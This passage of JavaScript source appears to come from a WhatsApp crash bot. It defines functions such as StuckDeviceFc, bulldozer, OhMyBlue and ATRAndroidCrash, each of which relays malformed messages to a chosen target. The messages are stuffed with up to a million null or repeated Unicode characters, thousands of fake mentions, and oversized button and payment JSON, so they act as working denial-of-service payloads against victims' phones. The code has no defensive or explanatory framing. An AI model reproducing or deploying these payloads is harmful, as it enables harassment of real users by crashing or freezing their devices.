666${"ᩫᩫ".repeat(4000)}\nPHOTO;BASE64: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\nX-WA-BIZ-NAME:🦠⃰͡°͜͡•⃟𝘅𝗿͢𝗲̷𝗹⃨𝗹𝘆̷͢-𝗰͢𝗹𝗶⃨𝗲𝗻̷͢𝘁 ⿻ 𝐓𝐡𝐫𝐞𝐞𝐬𝐢𝐱𝐭𝐲 ✶ > 666${"ᩫᩫ".repeat(4000)}\nEND:VCARD`,
        contextInfo: {
          participant: target,
          externalAdReply: {
            automatedGreetingMessageShown: true,
            automatedGreetingMessageCtaType: "\u0000".repeat(100000),
            greetingMessageBody: "\u0000"
          }
        }
      }
    },
    {}
  );

  await sock.relayMessage(
    "status@broadcast",
    msg.message,
    {
      messageId: msg.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: target },
                  content: undefined
                }
              ]
            }
          ]
        }
      ]
    }
  );
}

async function StuckDeviceFc(target) {
  const msg1 = {
    extendedTextMessage: {
      text: "$$$$$",
      locationMessage: {
        degressLatitude: 617267,
        degressLongitude: -6172677,
        isLive: true,
        accuracyInMetters: 100,
        jpegThumbnail: null,
      },
      contextInfo: {
        forwardingScore: 9471,
        isForwarded: true,
        mentionedJid: [
          "0@s.whatsapp.net",
          ...Array.from({ length: 1900 }, () => "1" + Math.floor(Math.random() * 500000000) + "@s.whatsapp.net")
        ],
        participant: target,
        stanzaId: target,
        entryPointConversionSource: "notification",
        remoteJid: target,
      },
      messageContextInfo: {
        deviceListMetadata: {},
        deviceListMetadataVersion: 3,
      },
    },
  };

  await sock.relayMessage(target, msg1, {
    messageId: null,
    participant: { jid: target },
  });
  
  const msg2 = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            contextInfo: {
              expiration: 1,
              ephemeralSettingTimestamp: 1,
              entryPointConversionSource: "WhatsApp.com",
              entryPointConversionApp: "WhatsApp",
              entryPointConversionDelaySeconds: 1,
              disappearingMode: {
                initiatorDeviceJid: target,
                initiator: "INITIATED_BY_OTHER",
                trigger: "UNKNOWN_GROUPS"
              },
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              mentionedJid: [target],
              businessMessageForwardInfo: {
                 businessOwnerJid: "13135550002@s.whatsapp.net"
              },
              quotedMessage: {
                callLogMesssage: {
                  isVideo: false,
                  callOutcome: "ONGOING",
                  durationSecs: "0",
                  callType: "VOICE_CHAT",
                  participants: [
                    {
                      jid: "13135550002@s.whatsapp.net",
                      callOutcome: "CONNECTED"
                    },
                    ...Array.from({ length: 10000 }, () => ({
                      jid: `1${Math.floor(Math.random() * 99999)}@s.whatsapp.net`,
                      callOutcome: "CONNECTED"
                    }))
                  ]
                }
              },
              externalAdReply: {
                showAdAttribution: false,
                renderLargerThumbnail: true
              }
            },
            header: {
              videoMessage: {
                url: "https://mmg.whatsapp.net/o1/v/t24/f2/m232/AQOS7xVULFd5Ekk1T8o8pWSq-j5UmHzUPG5sq0frfEogEtMRJ_FNjaT7rKYUSm-iImapgmKZ7iq5_9_CC8mSbD0me0ye2OcoyDxaqJU?ccb=9-4&oh=01_Q5Aa2AFf2ZI7JiJkIlqsek6JvJAGekHxXtN9qtw95RhN1meW8g&oe=68987468&_nc_sid=e6ed6c&mms3=true",
                mimetype: "video/mp4",
                fileSha256: "pctPKf/IwXKoCzQ7da4YrzWk+K9kaySQuWqfbA8h0FY=",
                fileLength: "847271",
                seconds: 7,
                mediaKey: "dA+Eu1vaexH4OIHRZbL8uZIND+CKA6ykw9B2OrL+DH4=",
                gifPlayback: true,
                height: 1280,
                width: 576,
                fileEncSha256: "GwTECHj+asNIHYh/L6NAX+92ob/LDSP5jgx/icqHWvk=",
                directPath: "/o1/v/t24/f2/m232/AQOS7xVULFd5Ekk1T8o8pWSq-j5UmHzUPG5sq0frfEogEtMRJ_FNjaT7rKYUSm-iImapgmKZ7iq5_9_CC8mSbD0me0ye2OcoyDxaqJU?ccb=9-4&oh=01_Q5Aa2AFf2ZI7JiJkIlqsek6JvJAGekHxXtN9qtw95RhN1meW8g&oe=68987468&_nc_sid=e6ed6c",
                mediaKeyTimestamp: "1752236759",
                jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/4gIoSUNDX1BST0ZJTEUAAQEAAAIYAAAAAAQwAABtbnRyUkdCIFhZWiAAAAAAAAAAAAAAAABhY3NwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAA9tYAAQAAAADTLQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAlkZXNjAAAA8AAAAHRyWFlaAAABZAAAABRnWFlaAAABeAAAABRiWFlaAAABjAAAABRyVFJDAAABoAAAAChnVFJDAAABoAAAAChiVFJDAAABoAAAACh3dHB0AAAByAAAABRjcHJ0AAAB3AAAADxtbHVjAAAAAAAAAAEAAAAMZW5VUwAAAFgAAAAcAHMAUgBHAEIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFhZWiAAAAAAAABvogAAOPUAAAOQWFlaIAAAAAAAAGKZAAC3hQAAGNpYWVogAAAAAAAAJKAAAA+EAAC2z3BhcmEAAAAAAAQAAAACZmYAAPKnAAANWQAAE9AAAApbAAAAAAAAAABYWVogAAAAAAAA9tYAAQAAAADTLW1sdWMAAAAAAAAAAQAAAAxlblVTAAAAIAAAABwARwBvAG8AZwBsAGUAIABJAG4AYwAuACAAMgAwADEANv/bAEMABgQFBgUEBgYFBgcHBggKEAoKCQkKFA4PDBAXFBgYFxQWFhodJR8aGyMcFhYgLCAjJicpKikZHy0wLSgwJSgpKP/bAEMBBwcHCggKEwoKEygaFhooKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKP/AABEIAGQALQMBIgACEQEDEQH/xAAbAAEAAgMBAQAAAAAAAAAAAAAAAgMBBAYFB//EACsQAAICAQIFAwQCAwAAAAAAAAECAAMRBCEFEhMxUQcUQQYiYXEygUKx8P/EABcBAQEBAQAAAAAAAAAAAAAAAAABAgP/xAAZEQEBAAMBAAAAAAAAAAAAAAAAEQEhQTH/2gAMAwEAAhEDEQA/APgGl4Jq7bbKarOGZcBc366irGWODl3HKfsOc9gRnHMM+PNqxk6NTk6g2tzGwscKT8EH5/MoPOACeYA7g+Z0YqETPMfJjmPkyi/TaezUNVXWaFL2isGy1EALbbliML+TsPIlBjmPkzJDL/IEfuB7vEeFcR4dodFbrPboLUWxUP3MitULKywwQA6OCp/B7FWxqXLxLUXanVGqzVBbCtt/R51LE/JI7kn533nnvdY61K9jstS8tYLEhBknA8DJJ/ZMgSTjJ7bRvosa1+pzMqBtjjpgDt4xiHuZyCRXt4rUf6EqiBY1rNnITcY2QD5z4/7t2mbKLkqrtsqsWq3PTcqQr4ODg/OJVJvY7oiO7MiDCKTkKM5wPG5JkTN4hERKpERAyO8MMEjbbxMRAREQEREBERAREQEREBERARNvQ6CzWLc1dlKCpC7dSwKSNtgO5O/Yb9z2BI1JEIk7UNdj1sVLKSpKsGG3gjY/sSft39p7nmq6fP08dVefOM/wzzY/OMfGcyqxpdPdq9TTptJTZfqLnFddVSlndicBVA3JJOABOp9RvpLjP0nxHS1cb4E/B+vWz1DqrctgDn/NSVLKCoIGDjlJA5t+d4RrdVw7i2i13DrRTrdNel1Fh5cJYrAqfu22IHfbzOs9UvUjjfqHrtG/GvYLVoA6UJoqmSsliOZ/vJYk8q9zjCjYHOVz4mq4gEjOD32MCIhVuptbUXvbYKw7nJFdaov9KoAH9CV4iIEYiIH/2Q==",
                gifAttribution: "NONE"
              },
              hasMediaAttachment: false
            },
            body: {
              text: "ꦾ".repeat(50000)
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(20000),
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: ""
                },
                {
                  name: "galaxy_message",
                  buttonParamsJson: JSON.stringify({
                    flow_action: "navigate",
                    flow_action_payload: { screen: "CTZ_SCREEN" },
                    flow_cta: "ꦾ".repeat(50000),
                    flow_id: "UNDEFINEDONTOP",
                    flow_message_version: "9.903",
                    flow_token: "UNDEFINEDONTOP"
                  })
                }
              ]
            }
          }
        }
      }
    },
    {}
  );

  await sock.relayMessage(target, msg2.message, {
    participant: { jid: target },
    messageId: msg2.key.id
  });

  await sock.relayMessage(
    target,
    {
      groupInviteMessage: {
        groupJid: "120363347113453659@g.us",
        inviteCode: "x",
        inviteExpiration: Date.now(),
        groupName: "$$$$$$$$".repeat(10000),
        caption:"ꦾ".repeat(50000),
        jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/4gIoSUNDX1BST0ZJTEUAAQEAAAIYAAAAAAQwAABtbnRyUkdCIFhZWiAAAAAAAAAAAAAAAABhY3NwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAA9tYAAQAAAADTLQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAlkZXNjAAAA8AAAAHRyWFlaAAABZAAAABRnWFlaAAABeAAAABRiWFlaAAABjAAAABRyVFJDAAABoAAAAChnVFJDAAABoAAAAChiVFJDAAABoAAAACh3dHB0AAAByAAAABRjcHJ0AAAB3AAAADxtbHVjAAAAAAAAAAEAAAAMZW5VUwAAAFgAAAAcAHMAUgBHAEIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFhZWiAAAAAAAABvogAAOPUAAAOQWFlaIAAAAAAAAGKZAAC3hQAAGNpYWVogAAAAAAAAJKAAAA+EAAC2z3BhcmEAAAAAAAQAAAACZmYAAPKnAAANWQAAE9AAAApbAAAAAAAAAABYWVogAAAAAAAA9tYAAQAAAADTLW1sdWMAAAAAAAAAAQAAAAxlblVTAAAAIAAAABwARwBvAG8AZwBsAGUAIABJAG4AYwAuACAAMgAwADEANv/bAEMABgQFBgUEBgYFBgcHBggKEAoKCQkKFA4PDBAXFBgYFxQWFhodJR8aGyMcFhYgLCAjJicpKikZHy0wLSgwJSgpKP/bAEMBBwcHCggKEwoKEygaFhooKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKP/AABEIAGQALQMBIgACEQEDEQH/xAAbAAEAAgMBAQAAAAAAAAAAAAAAAgMBBAYFB//EACsQAAICAQIFAwQCAwAAAAAAAAECAAMRBCEFEhMxUQcUQQYiYXEygUKx8P/EABcBAQEBAQAAAAAAAAAAAAAAAAABAgP/xAAZEQEBAAMBAAAAAAAAAAAAAAAAEQEhQTH/2gAMAwEAAhEDEQA/APgGl4Jq7bbKarOGZcBc366irGWODl3HKfsOc9gRnHMM+PNqxk6NTk6g2tzGwscKT8EH5/MoPOACeYA7g+Z0YqETPMfJjmPkyi/TaezUNVXWaFL2isGy1EALbbliML+TsPIlBjmPkzJDL/IEfuB7vEeFcR4dodFbrPboLUWxUP3MitULKywwQA6OCp/B7FWxqXLxLUXanVGqzVBbCtt/R51LE/JI7kn533nnvdY61K9jstS8tYLEhBknA8DJJ/ZMgSTjJ7bRvosa1+pzMqBtjjpgDt4xiHuZyCRXt4rUf6EqiBY1rNnITcY2QD5z4/7t2mbKLkqrtsqsWq3PTcqQr4ODg/OJVJvY7oiO7MiDCKTkKM5wPG5JkTN4hERKpERAyO8MMEjbbxMRAREQEREBERAREQEREBERARNvQ6CzWLc1dlKCpC7dSwKSNtgO5O/Yb9z2BI1JEIk7UNdj1sVLKSpKsGG3gjY/sSft39p7nmq6fP08dVefOM/wzzY/OMfGcyqxpdPdq9TTptJTZfqLnFddVSlndicBVA3JJOABOp9RvpLjP0nxHS1cb4E/B+vWz1DqrctgDn/NSVLKCoIGDjlJA5t+d4RrdVw7i2i13DrRTrdNel1Fh5cJYrAqfu22IHfbzOs9UvUjjfqHrtG/GvYLVoA6UJoqmSsliOZ/vJYk8q9zjCjYHOVz4mq4gEjOD32MCIhVuptbUXvbYKw7nJFdaov9KoAH9CV4iIEYiIH/2Q=="
      }
    },
    {
      participant: { jid: target },
      ephemeralExpiration: 5,
      timeStamp: Date.now()
    }
  );
}

async function PaymentFC(sock, target) {
    const requestPaymentMsg = {
        requestPaymentMessage: {
            amount: {
                value: 2,
                offset: 1,
                currencyCodeIso4217: "IDR",
                requestFrom: target,
                caption: "zephyrinē sદx",
                showAdAttribution: false,
                expiryTimestamp: Date.now() + 1000
            },
            contextInfo: {
                forwardingScore: 9999,
                isForwarded: true,
                remoteJid: "status@broadcast",
                externalAdReply: {
                    title: "zephyrinē sદx",
                    body: "",
                    mimetype: "audio/mpeg",
                    caption: "",
                    sourceUrl: "https://github.com/zephyrinee"
                }
            }
        }
    };

    await sock.relayMessage(target, requestPaymentMsg, {
        participant: { jid: target },
        userJid: target,
        messageId: null,
        quoted: null
    });
}

async function bulldozer(sock, target) {
  try {
    const Reomsg = {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {
              senderKeyIndex: 999999,
              senderTimestamp: Date.now() + 999999999,
            },
            deviceListMetadataVersion: 3,
          },
          interactiveMessage: {
            header: {
              title: "iya apin ganteng ko",
              hasMediaAttachment: true,
              locationMessage: {
                degreesLatitude: 323232.323232,
                degreesLongitude: -323232.323232,
                name: "}".repeat(5000),
                address: "{".repeat(4500),
              },
            },
            body: {
              text: "",
            },
            footer: {
              orderMessage: {
                orderId: "XIIX" + Date.now(),
                thumbnail: Buffer.from([]),
                itemCount: 1,
                status: 1,
                surface: 1,
                message: "OrderMessage",
                orderTitle: "Arcane",
                sellerJid: "0@s.whatsapp.net",
              },
            },
            contextInfo: {
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              mentionedJid: ["0@s.whatsapp.net"],
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: JSON.stringify({
                    title: "{".repeat(10000),
                  }),
                },
              ],
            },
          },
        },
      },
    };
    await sock.relayMessage(target, Reomsg, {
      participant: { jid: target },
    });
    console.log("SUCCESS");
  } catch (e) {
    console.log("ERROR", e);
  }
}

async function OhMyBlue(sock, target) {
  const msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "$",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "review_and_pay",
            paramsJson: `{"currency":"USD","pay*ment_configuration":"","payment_type":"","transaction_id":"","total_amount":{"value":879912500,"offset":100},"reference_id":"4N88TZPXWUM","type":"physical-goods","payment_method":"","order":{"status":"pending","description":"","subtotal":{"value":990000000,"offset":100},"tax":{"value":8712000,"offset":100},"discount":{"value":118800000,"offset":100},"shipping":{"value":500,"offset":100},"order_type":"ORDER","items":[{"retailer_id":"custom-item-c580d7d5-6411-430c-b6d0-b84c242247e0","name":"COSMOX","amount":{"value":1000000,"offset":100},"quantity":99},{"retailer_id":"custom-item-e645d486-ecd7-4dcb-b69f-7f72c51043c4","name":"XCURSED","amount":{"value":5000000,"offset":100},"quantity":99},{"retailer_id":"custom-item-ce8e054e-cdd4-4311-868a-163c1d2b1cc3","name":"null","amount":{"value":4000000,"offset":100},"quantity":99}]},"additional_note":${"\u0000".repeat(1000000)}}`,
            version: 3
          },
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from({ length: 2000 }, () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
              )
            ],
            remoteJid: "status@broadcast",
            forwardingScore: 9999,
            isForwarded: true
          }
        }
      }
    }
  }, {
    ephemeralExpiration: 0,
      forwardingScore: 9741,
      isForwarded: true,
      font: Math.floor(Math.random() * 99999999),
      background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999")
  });

  await sock.relayMessage(target, {
    groupStatusMentionV2: {
      message: msg.message
    }
  }, {
    messageId: msg.key.id,
    participant: { jid: target }
  });

  const msgs = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "$",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: `${"\x50".repeat(1045000)}`,
            version: 3
          },
          contextInfo: {
           mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from({ length: 2000 }, () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
              )
            ]
          }
        }
      }
    }
  }, {});

  await sock.relayMessage(target, {
    groupStatusMentionV2: {
      message: msgs.message
    }
  }, {
    messageId: msgs.key.id,
    participant: { jid: target }
  });

  const msgw = await generateWAMessageFromContent(target, {
    ephemeralMessage: {
      message: {
        viewOnceMessage: {
          message: {
            interactiveResponseMessage: {
              body: {
                text: "$",
                format: "DEFAULT"
              },
              nativeFlowResponseMessage: {
                name: "call_permission_request",
                paramsJson: "\x10".repeat(1000000),
                version: 3
              },
              entryPointConversionSource: "payment_info"
            }
          }
        }
      }
    }
  }, {});

  await sock.relayMessage(target, {
    groupStatusMentionV2: {
      message: msgw.message
    }
  }, {
    messageId: msgw.key.id,
    participant: { jid: target }
  });
  const delayMsg = generateWAMessageFromContent(target, {
    interactiveResponseMessage: {
      body: {
        text: "$",
        format: "DEFAULT"
      },
      nativeFlowResponseMessage: {
        name: "address_message",
        paramsJson: `{\"values\":{\"in_pin_code\":\"999999\",\"building_name\":\"JAWIER\",\"landmark_area\":\"X\",\"address\":\"KELRA\",\"tower_number\":\"KELRA\",\"city\":\"kakeklu\",\"name\":\"KELRA\",\"phone_number\":\"999999\",\"house_number\":\"xxx\",\"floor_number\":\"xxx\",\"state\":\"KELRA | ${"\u0000".repeat(19999)}\"}}`,
        version: 3
      }
    }
  }, { userJid: target });

  await sock.relayMessage(
    target,
    {
      groupStatusMessageV2: {
        message: delayMsg.message
      }
    },
    {
      messageId: delayMsg.key.id,
      participant: { jid: target }
    }
  );
}

async function locrsh(sock, target) {
  let locaMessage = {
    ephemeralMessage: {
      message: {
        interactiveMessage: {
          header: {
            title: "👁‍🗨⃟꙰。⃝𝐕𝐢 ‌ 𝐧𝐳⃰ ⌁ 𝐇𝐢𝐝𝐳𝐲𝐲.ꪸ⃟‼️",
            hasMediaAttachment: true,
            locationMessage: {
              degreesLatitude: -999.0349999999999,
              degreesLongitude: 922.999999999999,
              name: "⿻  ⌜ 𝐇𝐢𝐝𝐳𝐲𝐲𝐙𝐡𝐢𝐫𝐨🐉 ⌟  ⿻" + "ꦽ".repeat(10000),
              address: "⭑̤⟅̊༑ ▾ 𝐙͢𝐍ͮ𝐗 ⿻ 𝐈𝐍͢𝐕𝚫𝐒𝐈͢𝚯𝚴 ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑" + "ꦽ".repeat(10000),
            }
          },
          body: {
            text: ""
          },
          nativeFlowMessage: {
            buttons: [
              {
                name: "single_select",
                buttonParamsJson: `{"title":"${"𑲭𑲭".repeat(10000)}","sections":[{"title":"9-9-9","rows":[]}]}`,
              },
              {
                name: "cta_url",
                buttonParamsJson: `{"display_text":"${"ꦽ".repeat(10000)}","url":"https:","merchant_url":"https:"}`
              },
              {
                name: "cta_copy",
                buttonParamsJson: `{"display_text":"${"𑲭".repeat(10000)}","copy_code":"R"}`
              },
              {
                name: "galaxy_message",
                buttonParamsJson: `{"icon":"REVIEW","flow_cta":"${"𑲭𑲭".repeat(10000)}","flow_message_version":"3"}`
              }
            ]
          },
          contextInfo: {
            mentionedJid: Array.from({ length: 1900 }, () =>
            "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
              ),
            remoteJid: "status@broadcast",
            stanzaId: "666",
            participant: target,
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 3,
                expiryTimestamp: Date.now() + 1814400000
              }
            }
          }
        }
      }
    }
  };

  await sock.relayMessage(target, locaMessage, {
    messageId: null,
    participant: { jid: target }
  });
}

async function ATRAndroidCrash(sock, target) {
  const OnceMessage = [];

  OnceMessage.push(
    {
      name: "cta_call",
      buttonParamsJson: JSON.stringify({
        display_text: "ꦽ".repeat(5000),
      }),
    },
    {
      name: "cta_copy",
      buttonParamsJson: JSON.stringify({
        display_text: "ꦽ".repeat(5000),
      }),
    },
    {
      name: "quick_reply",
      buttonParamsJson: JSON.stringify({
        display_text: "ꦽ".repeat(5000),
      }),
    }
  );

  const msg = {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2,
        },
        interactiveMessage: {
          header: {
            title: ".",
            locationMessage: {},
            hasMediaAttachment: true,
          },
          body: {
            text: " ꦾꦾꦾꦾꦾl " + "\0".repeat(900000),
          },
          footer: {
            text: "{" + "ꦾ".repeat(9000),
          },
          nativeFlowMessage: {
            name: "review_and_pay".repeat(5000),
            buttonParamsJson:
              '{"currency":"IDR","total_amount":{"value":0,"offset":0},"reference_id":null,"type":"physical-goods","order":{"status":null,"subtotal":{"value":0,"offset":0},"order_type":"PAYMENT_REQUEST","items":[{"retailer_id":null,"name":null,"amount":{"value":0,"offset":0},"quantity":0}]},"additional_note":null,"native_payment_methods":[],"share_payment_status":true,"buttons":[{"name":"payment_method","buttonParamsJson":"{\\"reference_id\\":null,\\"payment_method\\":0,\\"payment_timestamp\\":null,\\"share_payment_status\\":true}"}]}',
          },
          carouselMessage: {},
          buttons: OnceMessage,
          contextInfo: {
            mentionedJid: [
              target,
              "support@s.whatsapp.net",
              "13135550002@s.whatsapp.net",
              ...Array.from({ length: 1990 }, (_, i) => `1${3000000000 + i}@s.whatsapp.net`),
            ],
            stanzaId: "Payment".repeat(1000),
            participant: target,
            isForwarded: true,
            forwardingScore: 9999,
            quotedMessage: {
              interactiveMessage: {
                body: {
                  text: "ꦾ Crash Android",
                },
                footer: {
                  text: " — Tras4sh - Function Crash ATHERIA",
                },
                nativeFlowMessage: {
                  messageParamsJson: "{}",
                },
              },
            },
          },
          extendedTextMessage: {
            sendnoteMessage: {
              text: "ꦽ".repeat(15000) + "ꦾ".repeat(10000),
              contextInfo: {
                mentionedJid: ["0@s.whatsapp.net"],
                participant: target,
                quotedMessage: {
                  paymentInviteMessage: {
                    serviceType: 3,
                    expiryTimestamp: Date.now() + 1814400000,
                  },
                },
              },
            },
            locationMessage: {
              degreesLatitude: 0,
              degreesLongitude: -0,
              name: "ꦾꦾꦾꦾꦾꦾꦾ".repeat(20000),
              address: "ꦾꦾꦾꦾꦾꦾ" + "{".repeat(30000),
            },
          },
        },
      },
    },
  };

  await sock.relayMessage(target, msg, {
    messageId: null,
    participant: { jid: target },
  });
}

async function DelayBulldoV2(sock, target) {
  try {
    const stickerPayload = {
      viewOnceMessage: {
        message: {
          stickerMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
            fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
            fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
            mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
            mimetype: "image/webp",
            directPath: "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc",
            isAnimated: true,
            stickerSentTs: { low: -1939477883, high: 406, unsigned: false },
            isAvatar: false,
            isAiSticker: false,
            isLottie: false
          }
        }
      }
    };

    const audioPayload = {
      ephemeralMessage: {
        message: {
          audioMessage: {
